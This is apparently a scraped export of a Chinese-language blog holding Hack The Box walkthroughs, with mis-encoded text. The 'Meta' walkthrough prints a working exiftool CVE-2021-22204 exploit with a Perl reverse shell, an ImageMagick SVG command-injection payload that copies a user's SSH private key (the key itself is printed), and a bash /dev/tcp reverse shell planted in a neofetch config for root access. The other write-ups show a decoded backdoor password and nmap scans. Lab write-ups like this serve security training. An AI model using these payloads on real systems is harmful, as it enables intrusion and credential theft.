0xb2d6f4a0fda0b3d6; backdoor[30] = -0x5b; backdoor._0_4_ = 0xf0e7abd6; backdoor._4_4_ = 0xa4b3a3f3; backdoor._8_4_ = 0xf7bbfdc8; backdoor._12_4_ = 0xfdb3d6e7; æˆ‘ä»¬ç»™å®ƒæ’åºä¸€ä¸‹ï¼Œä»é«˜åˆ°ä½æ’åº backdoor[30] = -0x5b; backdoor._28_2_ = 0xa9f4; backdoor._24_4_ = 0xbcf0b5e3; backdoor._16_8_ = 0xb2d6f4a0fda0b3d6; backdoor._12_4_ = 0xfdb3d6e7; backdoor._8_4_ = 0xf7bbfdc8; backdoor._4_4_ = 0xa4b3a3f3; backdoor._0_4_ = 0xf0e7abd6; 0x5b 0xa9f4 0xbcf0b5e3 0xb2d6f4a0fda0b3d6 0xfdb3d6e7 0xf7bbfdc8 0xa4b3a3f3 0xf0e7abd6 è¿™è¾¹æ’åºå¥½ä»¥åï¼Œå³é”®æŸ¥çœ‹ä¸€ä¸‹0x5b å‘ç°æ­£ç¡®çš„åº”è¯¥æ˜¯0xa5ï¼Œä¿®æ”¹ä¸€ä¸‹åå»åšä¸€ä¸‹ç¼–ç  é¦–å…ˆè½¬åŒ–æˆHEXå†è½¬åŒ–ä¸ºXOR https://gchq.github.io/CyberChef/#recipe=Swap_endianness(â€˜Hexâ€™,31,true)From_Hex(â€˜Autoâ€™)XOR({â€˜optionâ€™:â€™Hexâ€™,â€™stringâ€™:â€™96â€™},â€™Standardâ€™,false)&amp;input&#x3D;MHhhNQoweGE5ZjQKMHhiY2YwYjVlMwoweGIyZDZmNGEwZmRhMGIzZDYKMHhmZGIzZDZlNwoweGY3YmJmZGM4CjB4YTRiM2EzZjMKMHhmMGU3YWJkNg è¿™æ˜¯æœ€ç»ˆæ”¹å‡ºæ¥çš„æ•ˆæœï¼Œç‚¹å¼€å³å¯çœ‹åˆ°æˆ‘çš„ç»“æœ 0xa5 0xa9f4 0xbcf0b5e3 0xb2d6f4a0fda0b3d6 0xfdb3d6e7 0xf7bbfdc8 0xa4b3a3f3 0xf0e7abd6 @=qfe5%2^k-aq@%k@%6k6b@$u#f*b?3 å¾—åˆ°äº†backdoorçš„å¯†ç  â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop] â””â”€# ssh root@10.10.11.146 The authenticity of host &#39;10.10.11.146 (10.10.11.146)&#39; can&#39;t be established. ECDSA key fingerprint is SHA256:2jPT4mThqEcnA/qjjQsIWwy2QNwGObWQX5MjK5YNvCM. Are you sure you want to continue connecting (yes/no/[fingerprint])? yes Warning: Permanently added &#39;10.10.11.146&#39; (ECDSA) to the list of known hosts. root@10.10.11.146&#39;s password: Last login: Fri Feb 25 12:56:49 2022 from 10.10.14.76 root@production:~# whoami&amp;&amp;id root uid=0(root) gid=0(root) groups=0(root) æˆåŠŸææƒåˆ°root root@production:~# ls root.txt root@production:~# cat root.txt 4a243e1e3ccb05dbcd7a29abb49d3bcf æˆåŠŸæ‹¿åˆ°rootçš„flagæ–‡ä»¶","categories":[],"tags":[{"name":"Hackthebox","slug":"Hackthebox","permalink":"http://www.lucifiel.com/tags/Hackthebox/"}]},{"title":"Meta - Hackthebox","slug":"Hackthebox - Meta","date":"2022-02-22T11:38:36.000Z","updated":"2023-05-20T01:58:48.000Z","comments":true,"path":"2022/02/22/Hackthebox - Meta/","link":"","permalink":"http://www.lucifiel.com/2022/02/22/Hackthebox%20-%20Meta/","excerpt":"","text":"Hackthebox - Metaé¶åœºä¿¡æ¯ é¶åœºç±»å‹ ä¿¡æ¯æœé›†Nmapé¦–å…ˆä½¿ç”¨nmapè¿›è¡Œç«¯å£æ‰«æ â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop] â””â”€# nmap -sS -A -sC -sV -p- --min-rate 5000 10.10.11.140 Starting Nmap 7.91 ( https://nmap.org ) at 2022-02-19 21:46 EST Nmap scan report for 10.10.11.140 Host is up (0.22s latency). Not shown: 65533 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0) | ssh-hostkey: | 2048 12:81:17:5a:5a:c9:c6:00:db:f0:ed:93:64:fd:1e:08 (RSA) | 256 b5:e5:59:53:00:18:96:a6:f8:42:d8:c7:fb:13:20:49 (ECDSA) |_ 256 05:e9:df:71:b5:9f:25:03:6b:d0:46:8d:05:45:44:20 (ED25519) 80/tcp open http Apache httpd |_http-server-header: Apache |_http-title: Did not follow redirect to http://artcorp.htb No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ). TCP/IP fingerprint: OS:SCAN(V=7.91%E=4%D=2/19%OT=22%CT=1%CU=40520%PV=Y%DS=2%DC=T%G=Y%TM=6211ABB OS:2%P=x86_64-pc-linux-gnu)SEQ(SP=107%GCD=1%ISR=109%TI=Z%CI=Z%II=I%TS=A)OPS OS:(O1=M505ST11NW7%O2=M505ST11NW7%O3=M505NNT11NW7%O4=M505ST11NW7%O5=M505ST1 OS:1NW7%O6=M505ST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN OS:(R=Y%DF=Y%T=40%W=FAF0%O=M505NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=A OS:S%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R OS:=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F OS:=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N% OS:T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD OS:=S) Network Distance: 2 hops Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel TRACEROUTE (using port 8888/tcp) HOP RTT ADDRESS 1 222.35 ms 10.10.14.1 2 222.43 ms 10.10.11.140 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 45.02 seconds Httpè¿›å…¥80ç«¯å£ä¼šè‡ªåŠ¨è·³è½¬åˆ°artcorp.htbï¼Œå…ˆåŠ å…¥åˆ°hosts echo 10.10.11.140 artcorp.htb &gt;&gt; /etc/hosts çœ‹æ ·å­æ˜¯ä¸€å®¶è‰ºæœ¯å…¬å¸ï¼Œè¿›æ¥åæ²¡æœ‰ä»€ä¹ˆæœ‰ç”¨çš„ä¸œè¥¿ï¼Œå…ˆfuzzä¸€ä¸‹ç›®å½•çœ‹çœ‹å§ Fuzzâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop] â””â”€# ffuf -u &quot;http://artcorp.htb/FUZZ&quot; -w /usr/share/seclists/Discovery/Web-Content/raft-small-directories.txt /&#39;___\\ /&#39;___\\ /&#39;___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v1.3.1 Kali Exclusive &lt;3 ________________________________________________ :: Method : GET :: URL : http://artcorp.htb/FUZZ :: Wordlist : FUZZ: /usr/share/seclists/Discovery/Web-Content/raft-small-directories.txt :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 40 :: Matcher : Response status: 200,204,301,302,307,401,403,405 ________________________________________________ assets [Status: 301, Size: 234, Words: 14, Lines: 8] css [Status: 301, Size: 231, Words: 14, Lines: 8] server-status [Status: 403, Size: 199, Words: 14, Lines: 8] [Status: 200, Size: 4427, Words: 1663, Lines: 87] :: Progress: [20116/20116] :: Job [1/1] :: 180 req/sec :: Duration: [0:01:54] :: Errors: 0 :: ä¹Ÿæ²¡ä»€ä¹ˆæœ‰ç”¨çš„ä¸œè¥¿ï¼Œå»fuzzä¸€ä¸‹å­åŸŸåçœ‹çœ‹ â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop] â””â”€# ffuf -c -u http://artcorp.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -H &quot;Host: FUZZ.artcorp.htb&quot; -mc 200 /&#39;___\\ /&#39;___\\ /&#39;___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v1.3.1 Kali Exclusive &lt;3 ________________________________________________ :: Method : GET :: URL : http://artcorp.htb :: Wordlist : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt :: Header : Host: FUZZ.artcorp.htb :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 40 :: Matcher : Response status: 200 ________________________________________________ dev01 [Status: 200, Size: 247, Words: 16, Lines: 10] :: Progress: [4989/4989] :: Job [1/1] :: 179 req/sec :: Duration: [0:00:32] :: Errors: 0 :: æœ‰ä¸€ä¸ªdev01ï¼ŒåŠ å…¥åˆ°hosts echo 10.10.11.140 dev01.artcorp.htb &gt;&gt; /etc/hosts Uploadsçœ‹ä¸å¤ªæ‡‚æœ‰ä»€ä¹ˆç”¨ï¼Œå…ˆç‚¹ç‚¹çœ‹çœ‹å§ è¿™è¾¹æ˜¯ä¸€ä¸ªä¸Šä¼ ç‚¹ï¼Œä¸Šä¼ ä¸€ä¸ªshellè¯•è¯• æç¤ºåªèƒ½ä¸Šä¼ jpgå’Œpngæ ¼å¼çš„æ–‡ä»¶ï¼Œé‚£å°±éšä¾¿æ‹¿å¼ å›¾è¯•è¯•å§ è¿™é‡Œåˆ—å‡ºäº†å›¾ç‰‡çš„å±æ€§ä¿¡æ¯ï¼Œæˆ‘çŒœæµ‹åº”è¯¥æ˜¯å›¾ç‰‡éšå†™æˆ–è€…exiftoolçš„cveæ¼æ´ä¹‹ç±»çš„ æœ¬åœ°ä½¿ç”¨exiftoolè¿›è¡Œç¡®è®¤ä¸€ä¸‹ å¯ä»¥å¯¹ä¸Šï¼Œæ˜¯exiftoolæ— ç–‘äº†ï¼Œå»æœç´¢ä¸€ä¸‹exiftoolçš„æ¼æ´ æ¼æ´åˆ©ç”¨ å‘ç°ä¸€ä¸ªå¯ç”¨çš„æ¼æ´ https://github.com/convisolabs/CVE-2021-22204-exiftool ä¸‹è½½ä¸‹æ¥åå°†IPå’Œç«¯å£ä¿®æ”¹ä¸ºè‡ªå·±çš„ #!/bin/env python3 import base64 import subprocess ip = &#39;10.10.14.16&#39; port = &#39;4444&#39; payload = b&quot;(metadata \\&quot;\\c${use MIME::Base64;eval(decode_base64(&#39;&quot; payload = payload + base64.b64encode( f&quot;use Socket;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&#39;tcp&#39;));if(connect(S,sockaddr_in({port},inet_aton(&#39;{ip}&#39;)))){{open(STDIN,'>&S');open(STDOUT,'>&S');open(STDERR,'>&S');exec('/bin/sh -i');}};&quot;.encode() ) payload = payload + b&quot;&#39;))};\\&quot;)&quot; payload_file = open(&#39;payload&#39;, &#39;w&#39;) payload_file.write(payload.decode(&#39;utf-8&#39;)) payload_file.close() subprocess.run([&#39;bzz&#39;, &#39;payload&#39;, &#39;payload.bzz&#39;]) subprocess.run([&#39;djvumake&#39;, &#39;exploit.djvu&#39;, &quot;INFO=1,1&quot;, &#39;BGjp=/dev/null&#39;, &#39;ANTz=payload.bzz&#39;]) subprocess.run([&#39;exiftool&#39;, &#39;-config&#39;, &#39;configfile&#39;, &#39;-HasselbladExif&lt;=exploit.djvu&#39;, &#39;image.jpg&#39;]) ç„¶åæ‰§è¡Œ â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop/CVE-2021-22204-exiftool] â””â”€# python3 exploit.py 1 image files updated â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop/CVE-2021-22204-exiftool] â””â”€# ls configfile exploit.djvu exploit.py image.jpg image.jpg_original lab payload payload.bzz README.md ç”Ÿæˆå‡ºæ¥çš„image.jpgå°±æ˜¯æˆ‘ä»¬çš„shelläº†ï¼Œæ‹¿å»ä¸Šä¼ åˆ°webé‡Œ ç„¶åæœ¬åœ°è¿è¡Œä¸€ä¸ªncç›‘å¬ç«¯å£ nc -nvlp 4444 é€‰æ‹©åæ‰§è¡Œå³å¯ â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop] â””â”€# nc -nvlp 4444 listening on [any] 4444 ... connect to [10.10.14.16] from (UNKNOWN) [10.10.11.140] 39314 /bin/sh: 0: can&#39;t access tty; job control turned off $ python3 -c &quot;import pty;pty.spawn(&#39;/bin/bash&#39;)&quot;; bash-5.0$ whoami&amp;&amp;id whoami&amp;&amp;id www-data uid=33(www-data) gid=33(www-data) groups=33(www-data) æˆåŠŸæ‹¿åˆ°ä¸€ä¸ªshell Ctrl+Zè¿”å› stty raw -echo; fg export TERM=xterm stty rows 51 cols 237 æƒé™æå‡Useråœ¨&#x2F;home&#x2F;thomasä¸­çœ‹åˆ°æœ‰.sshæ–‡ä»¶å¤¹ è¿›å…¥.sshæ–‡ä»¶å¤¹æ‹¿keyï¼Œä½†æ˜¯å‘ç°æ²¡æƒé™ bash-5.0$ find /usr/ -type f -newermt &#39;2022-01-01&#39; -ls 152500 4 -rwxr-xr-x 1 root root 126 Jan 3 10:13 /usr/local/bin/convert_images.sh æŸ¥æ‰¾ä¸€ä¸‹ä»2022-01-01å¼€å§‹åˆ›å»ºçš„æ–°æ–‡ä»¶ï¼Œæ‰¾åˆ°äº†ä¸€ä¸ªshè„šæœ¬ æˆ–æ˜¯è¿è¡Œpspy64ä¹Ÿå¯ä»¥å‘ç°è¿™ä¸ªè„šæœ¬ æˆ‘ä»¬æŸ¥çœ‹ä¸€ä¸‹ #!/bin/bash cd /var/www/dev01.artcorp.htb/convert_images/ &amp;&amp; /usr/local/bin/mogrify -format png *.* 2&gt;/dev/null pkill mogrify è¿™é‡Œmogrifyåªæ˜¯ä¸€ä¸ªç®€å•çš„è„šæœ¬ï¼Œä½¿ç”¨ImageMgickçš„mogrifyå°†å‘ç°çš„æ–‡ä»¶è½¬æ¢ä¸ºpng bash-5.0$ /usr/local/bin/mogrify -version Version: ImageMagick 7.0.10-36 Q16 x86_64 2021-08-29 https://imagemagick.org Copyright: Â© 1999-2020 ImageMagick Studio LLC License: https://imagemagick.org/script/license.php Features: Cipher DPC HDRI OpenMP(4.5) Delegates (built-in): fontconfig freetype jng jpeg png x xml zlib https://insert-script.blogspot.com/2020/11/imagemagick-shell-injection-via-pdf.html æœ‰ä¸€ä¸ªç›¸å…³æ¼æ´ ç”Ÿæˆä¸€ä¸ªpoc.svg &lt;image authenticate=&#39;ff&quot; `echo $(id)&gt; /dev/shm/0wned`;&quot;&#39;&gt; &lt;read filename=&quot;pdf:/etc/passwd&quot;/&gt; &lt;get width=&quot;base-width&quot; height=&quot;base-height&quot; /&gt; &lt;resize geometry=&quot;400x400&quot; /&gt; &lt;write filename=&quot;test.png&quot; /&gt; &lt;svg width=&quot;700&quot; height=&quot;700&quot; xmlns=&quot;http://www.w3.org/2000/svg&quot; xmlns:xlink=&quot;http://www.w3.org/1999/xlink&quot;&gt; &lt;image xlink:href=&quot;msl:poc.svg&quot; height=&quot;100&quot; width=&quot;100&quot;/&gt; &lt;/svg&gt; &lt;/image&gt; æµ‹è¯•ä¸€ä¸‹æ˜¯å¦å¯ä»¥ä»¥thomasçš„èº«ä»½æ‰§è¡Œå‘½ä»¤ cp poc.svg /var/www/dev01.artcorp.htb/convert_images/ bash-5.0$ ls -la total 12 drwxrwxrwt 2 root root 100 Feb 21 23:53 . drwxr-xr-x 16 root root 3080 Feb 21 10:51 .. -rw-r--r-- 1 thomas thomas 54 Feb 21 23:53 0wned -rw-r--r-- 1 www-data www-data 406 Feb 21 23:52 poc.svg bash-5.0$ cat 0wned uid=1000(thomas) gid=1000(thomas) groups=1000(thomas) ç¡®è®¤å¯ä»¥ä»¥thomasçš„èº«ä»½æ‰§è¡Œå‘½ä»¤ï¼Œå’±ä»¬ä¿®æ”¹ä¸€ä¸‹pocçš„ç¬¬ä¸€å¥ï¼Œç”¨thomasçš„æƒé™æŠŠsshçš„keyç»™æ‹¿å‡ºæ¥ &lt;image authenticate=&#39;ff&quot; `echo $(cat ~/.ssh/id_rsa)&gt; /dev/shm/id_rsa`;&quot;&#39;&gt; ç„¶åå†æ‰§è¡Œä¸€æ¬¡ bash-5.0$ ls -la total 16 drwxrwxrwt 2 root root 120 Feb 21 23:58 . drwxr-xr-x 16 root root 3080 Feb 21 10:51 .. -rw-r--r-- 1 thomas thomas 54 Feb 21 23:53 0wned -rw-r--r-- 1 thomas thomas 2590 Feb 21 23:58 id_rsa -rw-r--r-- 1 www-data www-data 422 Feb 21 23:56 poc.svg å·²ç»å‚¨å­˜è¿‡æ¥äº†ï¼ŒæŸ¥çœ‹ä¸€ä¸‹ -----BEGIN OPENSSH PRIVATE KEY----- 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 bhFErAeoncE3vJAAAACXJvb3RAbWV0YQE= -----END OPENSSH PRIVATE KEY----- æˆåŠŸæ‹¿åˆ°thomasçš„keyï¼Œç°åœ¨ä¿å­˜åˆ°æœ¬åœ°id_rsaåç»™ä»–600çš„æƒé™ chmod 600 id_rsa ç„¶åä½¿ç”¨sshè¿›è¡Œè¿æ¥ â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop] â””â”€# ssh thomas@artcorp.htb -i id_rsa Linux meta 4.19.0-17-amd64 #1 SMP Debian 4.19.194-3 (2021-07-18) x86_64 The programs included with the Debian GNU/Linux system are free software; the exact distribution terms for each program are described in the individual files in /usr/share/doc/*/copyright. Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent permitted by applicable law. Last login: Mon Feb 21 15:30:44 2022 from 10.10.14.147 -bash-5.0$ whoami&amp;&amp;id thomas uid=1000(thomas) gid=1000(thomas) groups=1000(thomas) -bash-5.0$ ls user.txt -bash-5.0$ cat user.txt 9e36bb6959f1ba118cfe71b928ac66b6 æˆåŠŸæ‹¿åˆ°useræƒé™çš„flagæ–‡ä»¶ Root-bash-5.0$ sudo -l Matching Defaults entries for thomas on meta: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin, env_keep+=XDG_CONFIG_HOME User thomas may run the following commands on meta: (root) NOPASSWD: /usr/bin/neofetch \\&quot;\\&quot; sudo -lçœ‹åˆ°æœ‰ä¸€ä¸ªå¯ä»¥rootæƒé™æ‰§è¡Œçš„neofetch https://gtfobins.github.io/gtfobins/neofetch/ è¿™é‡Œæ‰¾åˆ°ä¸€ä¸ªææƒç›¸å…³çš„ ä½†æ˜¯æœ‰ä¸€ç‚¹ä¸ä¸€æ ·ï¼Œè¿™é‡Œçš„æƒé™åªèƒ½ä½¿ç”¨æŒ‡å®šå‚æ•° ä½†æ˜¯ä¼šä¿ç•™XDG_CONFIG_HOMEçš„ç¯å¢ƒå˜é‡ ç„¶åå½“å‰ç”¨æˆ·çš„neofetché…ç½®æ–‡ä»¶å¯æ§ ç°åœ¨æŒ‰ç…§è¿™ä¸ªæ€è·¯æ¥æ“ä½œå§ -bash-5.0$ cd ~/.config/neofetch/ -bash-5.0$ ls -la total 24 drwxr-xr-x 2 thomas thomas 4096 Feb 21 13:32 . drwxr-xr-x 3 thomas thomas 4096 Aug 30 13:01 .. -rw-r--r-- 1 thomas thomas 14591 Aug 30 13:01 config.conf åœ¨config.confçš„ç¬¬ä¸€è¡Œæ·»åŠ ä¸€ä¸ªåå‘shell /bin/bash -c &quot;/bin/bash -i &gt;&amp; /dev/tcp/10.10.14.16/4444 0&gt;&amp;1&quot; å°†thomas.configå¯¼å‡ºåˆ°åŸºæœ¬é…ç½®ç¯å¢ƒè·¯å¾„ export XDG_CONFIG_HOME=&quot;$HOME/.config&quot; åœ¨æœ¬åœ°å¯ç”¨ncç›‘å¬ä¸€ä¸ªç«¯å£ nc -nvlp 4444 ä»¥rootæƒé™æ‰§è¡Œneofetchæ–‡ä»¶ sudo -u root /usr/bin/neofetch \\&quot;\\&quot; â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop] â””â”€# nc -nvlp 4444 listening on [any] 4444 ... connect to [10.10.14.16] from (UNKNOWN) [10.10.11.140] 39366 root@meta:/home/thomas/.config/neofetch# whoami&amp;&amp;id whoami&amp;&amp;id root uid=0(root) gid=0(root) groups=0(root) æˆåŠŸè·å¾—rootæƒé™ root@meta:/home/thomas/.config/neofetch# cd /root cd /root root@meta:~# ls ls conf root.txt cat root.txt f3f5e2ad459dbd8842f813bec23889f0 æˆåŠŸæ‹¿åˆ°rootæƒé™çš„flagæ–‡ä»¶","categories":[],"tags":[{"name":"Hackthebox","slug":"Hackthebox","permalink":"http://www.lucifiel.com/tags/Hackthebox/"}]},{"title":"Devzat - Hackthebox","slug":"Hackthebox - Devzat","date":"2022-02-20T11:38:36.000Z","updated":"2023-05-20T01:32:05.000Z","comments":true,"path":"2022/02/20/Hackthebox - Devzat/","link":"","permalink":"http://www.lucifiel.com/2022/02/20/Hackthebox%20-%20Devzat/","excerpt":"","text":"Hackthebox - Devzaté¶åœºä¿¡æ¯ é¶åœºç±»å‹ ä¿¡æ¯æœé›†Nmapé¦–å…ˆä½¿ç”¨nmapè¿›è¡Œä¿¡æ¯æœé›† â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop] â””â”€# nmap -sS -A -sC -sV -p- --min-rate 5000 10.10.11.118 Starting Nmap 7.91 ( https://nmap.org ) at 2022-02-19 03:18 EST Nmap scan report for devzat.htb (10.10.11.118) Host is up (0.24s latency). Not shown: 65532 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 c2:5f:fb:de:32:ff:44:bf:08:f5:ca:49:d4:42:1a:06 (RSA) | 256 bc:cd:e8:ee:0a:a9:15:76:52:bc:19:a4:a3:b2:ba:ff (ECDSA) |_ 256 62:ef:72:52:4f:19:53:8b:f2:9b:be:46:88:4b:c3:d0 (ED25519) 80/tcp open http Apache httpd 2.4.41 |_http-server-header: Apache/2.4.41 (Ubuntu) |_http-title: devzat - where the devs at 8000/tcp open ssh (protocol 2.0) | fingerprint-strings: | NULL: |_ SSH-2.0-Go | ssh-hostkey: |_ 3072 6a:ee:db:90:a6:10:30:9f:94:ff:bf:61:95:2a:20:63 (RSA) 1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service : SF-Port8000-TCP:V=7.91%I=7%D=2/19%Time=6210A7FD%P=x86_64-pc-linux-gnu%r(NU SF:LL,C,&quot;SSH-2\\.0-Go\\r\\n&quot;); No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ). TCP/IP fingerprint: OS:SCAN(V=7.91%E=4%D=2/19%OT=22%CT=1%CU=34522%PV=Y%DS=2%DC=T%G=Y%TM=6210A83 OS:2%P=x86_64-pc-linux-gnu)SEQ(SP=100%GCD=1%ISR=10B%TI=Z%CI=Z%II=I%TS=A)OPS OS:(O1=M505ST11NW7%O2=M505ST11NW7%O3=M505NNT11NW7%O4=M505ST11NW7%O5=M505ST1 OS:1NW7%O6=M505ST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN OS:(R=Y%DF=Y%T=40%W=FAF0%O=M505NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=A OS:S%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R OS:=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F OS:=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N% OS:T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD OS:=S) Network Distance: 2 hops Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel TRACEROUTE (using port 554/tcp) HOP RTT ADDRESS 1 241.16 ms 10.10.14.1 2 241.26 ms devzat.htb (10.10.11.118) OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 93.93 seconds 